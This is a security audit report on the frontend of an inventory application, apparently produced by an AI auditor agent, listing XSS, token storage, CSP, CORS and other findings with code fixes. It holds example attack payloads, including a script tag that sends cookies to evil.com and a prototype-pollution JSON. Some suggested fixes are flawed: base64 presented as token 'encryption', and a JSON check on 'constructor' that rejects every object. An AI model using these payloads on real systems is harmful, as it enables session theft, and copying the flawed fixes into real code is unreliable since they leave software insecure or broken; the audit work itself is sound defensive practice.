# Security Audit Report

**Project:** Omiximo Inventory OS
**Date:** 2026-01-11
**Reviewer:** Security Auditor Agent
**Scope:** Frontend JavaScript, Authentication, API Interactions, Data Handling
**Standards:** OWASP Top 10 (2021), CWE/SANS Top 25

---

## Executive Summary

This security audit identified **23 security vulnerabilities** across the Omiximo Inventory OS frontend application. While the application benefits from a backend-enforced security model (InvenTree/Django), the frontend contains several vulnerabilities that could lead to data exposure, session hijacking, or cross-site scripting attacks.

**Overall Security Rating: 4/10 (Needs Improvement)**

### Vulnerability Summary

| Severity | Count | OWASP Category |
|----------|-------|----------------|
| Critical | 2 | A03:2021 Injection, A07:2021 Auth Failures |
| High | 6 | A01:2021 Broken Access Control, A02:2021 Crypto Failures |
| Medium | 9 | A05:2021 Security Misconfiguration |
| Low | 6 | A09:2021 Security Logging Failures |

---

## Critical Vulnerabilities

### SEC-001: Cross-Site Scripting (XSS) via Unsanitized HTML Injection (CRITICAL)

**OWASP:** A03:2021 - Injection
**CWE:** CWE-79 - Improper Neutralization of Input During Web Page Generation
**CVSS Score:** 8.1 (High)

**Location:** Multiple files, pattern throughout codebase

**Description:**
The application directly injects user-controlled data into HTML without sanitization. This allows attackers to inject malicious scripts that execute in users' browsers.

**Vulnerable Code Examples:**

```javascript
// app.js:2744-2750 - Part name injected directly
dom.catalogGrid.innerHTML = `
    <div class="catalog-empty">
        <p>${searchQuery ? `No parts found matching "${searchQuery}"` : 'No parts found.'}</p>
    </div>
`;
// If searchQuery = '<img src=x onerror="alert(1)">' - XSS!

// app.js:2893-2948 - Multiple fields injected
return `
    <div class="part-card" data-part-id="${part.pk}">
        <h3 class="part-name">${part.name || 'Unnamed Part'}</h3>
        <p class="part-desc">${part.description || 'No description'}</p>
    </div>
`;
// part.name or part.description could contain malicious HTML

// app.js:2841-2862 - Stock notes injected
return `
    <div class="batch-item" data-stock-id="${stock.pk}" onclick="batchDetail.show(${stock.pk})">
        <div class="batch-location">${location}</div>
    </div>
`;
// location could contain XSS payload

// app.js:3009-3018 - Supplier URL rendered as link
urlContainer.innerHTML = `
    <a href="${supplierURL}" target="_blank">
        <span class="supplier-link-text">${this.shortenURL(supplierURL)}</span>
    </a>
`;
// Malicious URL: javascript:alert(document.cookie)

// profit.js:420-468 - Component names injected
container.innerHTML = profitState.components.map((c, idx) => `
    <span class="component-name">${c.partName} x ${c.qty}</span>
`).join('');

// app.js:3689-3698 - Notification messages
container.innerHTML = visibleNotifs.map(notif => `
    <div class="notification-message">${notif.message}</div>
`).join('');
```

**Exploit Scenario:**
1. Attacker creates a part with name: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
2. When any user views the catalog, their session token is stolen
3. Attacker uses stolen token to access/modify inventory data

**Recommendation:**
Implement HTML sanitization for all user-generated content:

```javascript
const sanitize = {
    // Escape HTML entities
    escapeHtml(str) {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    // Validate URLs (only allow http/https)
    sanitizeUrl(url) {
        if (!url) return '';
        try {
            const parsed = new URL(url);
            if (!['http:', 'https:'].includes(parsed.protocol)) {
                return '#invalid-url';
            }
            return parsed.href;
        } catch {
            return '#invalid-url';
        }
    }
};

// Usage:
dom.catalogGrid.innerHTML = `
    <h3>${sanitize.escapeHtml(part.name)}</h3>
    <a href="${sanitize.sanitizeUrl(supplierURL)}">Link</a>
`;
```

---

### SEC-002: Insecure Token Storage (CRITICAL)

**OWASP:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-522 - Insufficiently Protected Credentials
**CVSS Score:** 7.5 (High)

**Location:** `/frontend/app.js:4241`, `/frontend/app.js:4176-4178`

**Description:**
API authentication tokens are stored in localStorage, which is vulnerable to XSS attacks. If an attacker exploits any XSS vulnerability (see SEC-001), they can steal authentication tokens.

**Vulnerable Code:**
```javascript
// app.js:4241 - Token stored in localStorage
localStorage.setItem('inventree_token', CONFIG.API_TOKEN);

// app.js:4176-4178 - Token retrieved from localStorage
const savedToken = localStorage.getItem('inventree_token');
if (savedToken) {
    CONFIG.API_TOKEN = savedToken;
}

// app.js:11-16 - Token held in global CONFIG object
const CONFIG = {
    API_BASE: '/api',
    API_TOKEN: null,  // Exposed globally
    // ...
};
```

**Attack Vector:**
1. XSS payload executes: `localStorage.getItem('inventree_token')`
2. Token exfiltrated to attacker server
3. Attacker makes authenticated API calls

**Recommendation:**
1. **Preferred:** Use httpOnly cookies for token storage (requires backend changes)
2. **Alternative:** Use sessionStorage instead (cleared on tab close)
3. **Minimum:** Implement token rotation and short expiration

```javascript
// If using localStorage is unavoidable, at least:
// 1. Encrypt the token
const encryptToken = (token) => {
    // Use Web Crypto API
    return btoa(token); // Minimal obfuscation - not secure alone
};

// 2. Add integrity checks
const storeToken = (token) => {
    const payload = {
        token: encryptToken(token),
        timestamp: Date.now(),
        fingerprint: generateBrowserFingerprint()
    };
    localStorage.setItem('auth', JSON.stringify(payload));
};

// 3. Validate on retrieval
const getToken = () => {
    const data = JSON.parse(localStorage.getItem('auth') || '{}');
    if (data.fingerprint !== generateBrowserFingerprint()) {
        // Token may be stolen - invalidate
        localStorage.removeItem('auth');
        return null;
    }
    return decryptToken(data.token);
};
```

---

## High Severity Vulnerabilities

### SEC-003: Missing Content Security Policy (HIGH)

**OWASP:** A05:2021 - Security Misconfiguration
**CWE:** CWE-1021 - Improper Restriction of Rendered UI Layers

**Location:** `/frontend/index.html`, `/frontend/nginx.conf`

**Description:**
The application does not implement Content Security Policy (CSP) headers, allowing inline scripts, external resources, and potentially malicious content injection.

**Current State:**
```html
<!-- index.html - No CSP meta tag -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Missing: <meta http-equiv="Content-Security-Policy" content="..."> -->
</head>
```

**Recommendation:**
Add CSP header in nginx.conf:
```nginx
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data:;
    connect-src 'self';
    frame-ancestors 'none';
" always;
```

---

### SEC-004: Prototype Pollution Risk (HIGH)

**OWASP:** A03:2021 - Injection
**CWE:** CWE-1321 - Improperly Controlled Modification of Object Prototype Attributes

**Location:** Multiple JSON parsing operations

**Description:**
The application parses JSON from localStorage and API responses without prototype pollution protection.

**Vulnerable Code:**
```javascript
// app.js:3444-3450 - JIT config from localStorage
getJitConfig(partPk) {
    try {
        const config = JSON.parse(localStorage.getItem('jit_config') || '{}');
        return config[partPk] || { delivery_days: 3, avg_sold_day: 0 };
    } catch {
        return { delivery_days: 3, avg_sold_day: 0 };
    }
}

// profit.js - Similar patterns with profitState
```

**Exploit:**
If localStorage contains:
```json
{"__proto__": {"isAdmin": true}}
```

Object.prototype is polluted, affecting all objects.

**Recommendation:**
```javascript
const safeJsonParse = (str, defaultValue = {}) => {
    try {
        const parsed = JSON.parse(str);
        // Prevent prototype pollution
        if (parsed.__proto__ || parsed.constructor) {
            console.warn('Prototype pollution attempt detected');
            return defaultValue;
        }
        return parsed;
    } catch {
        return defaultValue;
    }
};
```

---

### SEC-005: Clickjacking Vulnerability (HIGH)

**OWASP:** A05:2021 - Security Misconfiguration
**CWE:** CWE-1021 - Improper Restriction of Rendered UI Layers

**Location:** `/frontend/index.html`

**Description:**
No X-Frame-Options or frame-ancestors CSP directive, allowing the application to be embedded in iframes on malicious sites.

**Recommendation:**
```nginx
# In nginx.conf
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

---

### SEC-006: Sensitive Data Exposure in Console Logs (HIGH)

**OWASP:** A09:2021 - Security Logging and Monitoring Failures
**CWE:** CWE-532 - Information Exposure Through Log Files

**Location:** Throughout codebase

**Description:**
The application logs potentially sensitive information to the browser console.

**Examples:**
```javascript
// app.js:141-145 - Credentials in error context
console.error('Auth failed:', e);
// Could expose username if included in error

// app.js:4250 - API error details exposed
errorEl.innerHTML = `Connection Error: ${e.message}<br><small>API: ${CONFIG.API_BASE}</small>`;
console.error('Login error:', e);

// app.js:2236 - Part and price data logged
console.log(`📐 Set capacity for part ${partId} in ${shelfId}: ${capacity}`);

// profit.js - Transaction data logged
console.log(`💰 Profit recorded:`, profitData);
```

**Recommendation:**
Remove or conditionally disable logging:
```javascript
const logger = {
    isProduction: location.hostname !== 'localhost',
    log: function(...args) {
        if (!this.isProduction) {
            console.log(...args);
        }
    },
    error: function(context, error) {
        // Log to monitoring service, not console
        if (this.isProduction) {
            // sendToMonitoring(context, error);
        } else {
            console.error(context, error);
        }
    }
};
```

---

### SEC-007: CORS Misconfiguration (HIGH)

**OWASP:** A05:2021 - Security Misconfiguration
**CWE:** CWE-346 - Origin Validation Error

**Location:** Environment configuration (`.env`)

**Description:**
The application is configured with permissive CORS settings.

**Vulnerable Configuration:**
```bash
# From .env (per CLAUDE.md documentation)
INVENTREE_CORS_ORIGIN_ALLOW_ALL=True
```

**Impact:**
Any website can make authenticated API requests if the user is logged in.

**Recommendation:**
```bash
# In .env
INVENTREE_CORS_ORIGIN_ALLOW_ALL=False
INVENTREE_CORS_ORIGIN_WHITELIST=http://localhost:1441,https://your-domain.com
```

---

### SEC-008: Insecure Direct Object Reference (IDOR) Risk (HIGH)

**OWASP:** A01:2021 - Broken Access Control
**CWE:** CWE-639 - Authorization Bypass Through User-Controlled Key

**Location:** API calls throughout application

**Description:**
The application uses sequential/predictable IDs for accessing resources without client-side validation.

**Vulnerable Patterns:**
```javascript
// app.js:2982 - Direct stock access by ID
const stock = await api.request(`/stock/${stockId}/`);

// app.js:3105 - Delete by ID
await api.request(`/stock/${this.currentStock.pk}/`, { method: 'DELETE' });

// app.js:3573 - Part access by ID
await api.request(`/part/${this.currentPart.pk}/`, { method: 'PATCH' });
```

**Note:** This is partially mitigated by backend authorization, but client should validate access.

**Recommendation:**
- Ensure backend enforces tenant isolation
- Add client-side confirmation for destructive actions
- Consider UUIDs instead of sequential IDs

---

## Medium Severity Vulnerabilities

### SEC-009: Missing Rate Limiting (MEDIUM)

**Location:** API client (`/frontend/app.js:109-188`)

**Description:**
No client-side rate limiting for API requests, allowing accidental or intentional API flooding.

**Vulnerable Code:**
```javascript
// app.js:111-137 - No rate limiting
async request(endpoint, options = {}) {
    const response = await fetch(url, { ... });
    // No throttling, no request counting
}
```

**Recommendation:**
```javascript
const rateLimiter = {
    requests: [],
    maxRequests: 50,
    windowMs: 60000,

    async throttle() {
        const now = Date.now();
        this.requests = this.requests.filter(t => t > now - this.windowMs);
        if (this.requests.length >= this.maxRequests) {
            throw new Error('Rate limit exceeded. Please wait.');
        }
        this.requests.push(now);
    }
};
```

---

### SEC-010: Insecure Password Handling (MEDIUM)

**Location:** `/frontend/app.js:4222-4254`

**Description:**
Password is held in memory and visible in DOM until form submission.

**Vulnerable Code:**
```javascript
// app.js:4226 - Password read from DOM
const pass = document.getElementById('loginPass').value;
```

**Recommendation:**
- Clear password field after reading
- Use `autocomplete="current-password"` for browser security features
- Consider implementing CSP to prevent password field access

---

### SEC-011: Missing Input Length Validation (MEDIUM)

**Location:** Form handlers throughout

**Description:**
No maximum length validation on inputs, allowing potential DoS via oversized payloads.

**Examples:**
```javascript
// No length checks before API submission
const data = {
    name: document.getElementById('partName').value.trim(),
    description: document.getElementById('partDescription').value.trim(),
    // Could be megabytes of text
};
```

**Recommendation:**
```javascript
const validateInput = (value, maxLength = 1000) => {
    if (value.length > maxLength) {
        throw new Error(`Input exceeds maximum length of ${maxLength}`);
    }
    return value;
};
```

---

### SEC-012: Session Timeout Not Implemented (MEDIUM)

**Location:** `/frontend/app.js:4176-4186`

**Description:**
Stored tokens never expire on the client side.

**Recommendation:**
```javascript
const storeSession = (token) => {
    const session = {
        token,
        expiresAt: Date.now() + (24 * 60 * 60 * 1000), // 24 hours
        lastActivity: Date.now()
    };
    localStorage.setItem('session', JSON.stringify(session));
};

const getSession = () => {
    const session = JSON.parse(localStorage.getItem('session') || '{}');
    if (Date.now() > session.expiresAt) {
        localStorage.removeItem('session');
        return null;
    }
    // Also check idle timeout
    if (Date.now() - session.lastActivity > 30 * 60 * 1000) { // 30 min idle
        localStorage.removeItem('session');
        return null;
    }
    return session.token;
};
```

---

### SEC-013: Eval-like Patterns (MEDIUM)

**Location:** Various onclick handlers

**Description:**
Inline event handlers with dynamic function calls.

**Vulnerable Pattern:**
```javascript
// app.js:2848 - onclick with dynamic ID
onclick="batchDetail.show(${stock.pk})"

// app.js:2855 - Another dynamic onclick
onclick="event.stopPropagation(); batchEditor.show(${stock.pk})"

// app.js:3795 - onclick with dynamic pk
onclick="catalog.scrollToPart(${item.pk})"
```

**Recommendation:**
Use event delegation instead:
```javascript
document.getElementById('catalogGrid').addEventListener('click', (e) => {
    const card = e.target.closest('[data-part-id]');
    if (card) {
        const partId = parseInt(card.dataset.partId);
        // Handle click
    }
});
```

---

### SEC-014: Missing Subresource Integrity (SRI) (MEDIUM)

**Location:** `/frontend/index.html`

**Description:**
External CDN resources loaded without SRI hashes.

**Vulnerable Code:**
```html
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<!-- No integrity attribute -->
```

**Recommendation:**
```html
<script
    src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"
    integrity="sha384-[hash]"
    crossorigin="anonymous">
</script>
```

---

### SEC-015 to SEC-017: Additional Medium Issues

- **SEC-015:** No HTTPS enforcement (should redirect HTTP to HTTPS)
- **SEC-016:** Missing secure/httpOnly flags awareness (token cookie recommendation)
- **SEC-017:** Open redirect risk in supplier URL handling

---

## Low Severity Vulnerabilities

### SEC-018: Verbose Error Messages (LOW)

**Location:** Error handling throughout

**Description:**
Error messages may reveal internal system details.

```javascript
// app.js:4250
errorEl.innerHTML = `Connection Error: ${e.message}<br><small>API: ${CONFIG.API_BASE}</small>`;
```

---

### SEC-019: Missing Security Headers (LOW)

**Missing Headers:**
- X-Content-Type-Options: nosniff
- X-XSS-Protection: 1; mode=block (legacy)
- Referrer-Policy: strict-origin-when-cross-origin
- Permissions-Policy: geolocation=(), microphone=(), camera=()

---

### SEC-020 to SEC-023: Additional Low Issues

- **SEC-020:** No password strength requirements shown
- **SEC-021:** Missing autocomplete attributes
- **SEC-022:** Version information exposure in comments
- **SEC-023:** Debug code potentially left in production

---

## OWASP Top 10 Coverage

| OWASP 2021 | Status | Findings |
|------------|--------|----------|
| A01: Broken Access Control | Partial | SEC-008 |
| A02: Cryptographic Failures | At Risk | SEC-002 |
| A03: Injection | Critical | SEC-001, SEC-004 |
| A04: Insecure Design | Partial | Architecture issues |
| A05: Security Misconfiguration | At Risk | SEC-003, SEC-005, SEC-007 |
| A06: Vulnerable Components | Unknown | No dependency audit |
| A07: Auth Failures | At Risk | SEC-002, SEC-010, SEC-012 |
| A08: Software/Data Integrity | At Risk | SEC-014 |
| A09: Logging Failures | Issues Found | SEC-006 |
| A10: SSRF | N/A | Backend concern |

---

## Remediation Priority

### Immediate (P0 - Fix This Week)

1. **SEC-001:** Implement HTML sanitization for ALL user input
2. **SEC-002:** Move to httpOnly cookie or implement token protection
3. **SEC-003:** Add Content Security Policy headers
4. **SEC-006:** Remove sensitive data from console logs

### High Priority (P1 - Fix This Sprint)

5. **SEC-005:** Add X-Frame-Options header
6. **SEC-007:** Configure proper CORS whitelist
7. **SEC-014:** Add SRI to CDN resources

### Medium Priority (P2 - Fix This Month)

8. **SEC-004:** Add prototype pollution protection
9. **SEC-009:** Implement client-side rate limiting
10. **SEC-012:** Add session timeout

### Low Priority (P3 - Backlog)

11. **SEC-019:** Add remaining security headers
12. **SEC-013:** Refactor inline event handlers

---

## Security Testing Recommendations

### Manual Testing Checklist

- [ ] Test XSS in all input fields
- [ ] Verify token invalidation on logout
- [ ] Test IDOR on stock/part endpoints
- [ ] Verify CORS behavior with external origin
- [ ] Test session timeout behavior
- [ ] Verify rate limiting effectiveness

### Automated Security Scanning

```bash
# Recommended tools
npm install -g snyk
snyk test

# For frontend scanning
npx lighthouse http://localhost:1441 --view

# OWASP ZAP for dynamic testing
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:1441
```

---

## Secure Coding Guidelines

### For This Project

1. **Never use innerHTML with user data** - Use textContent or sanitize
2. **Always validate URLs** - Use URL constructor and check protocol
3. **Sanitize all localStorage data** - Parse safely, validate structure
4. **Use event delegation** - Avoid inline onclick handlers
5. **Log securely** - Never log credentials, tokens, or PII
6. **Validate input lengths** - Prevent oversized payloads
7. **Implement CSP** - Restrict resource loading
8. **Use SRI** - Verify CDN resource integrity

---

**Report Generated:** 2026-01-11
**Classification:** CONFIDENTIAL
**Next Audit:** Recommended after critical fixes implemented
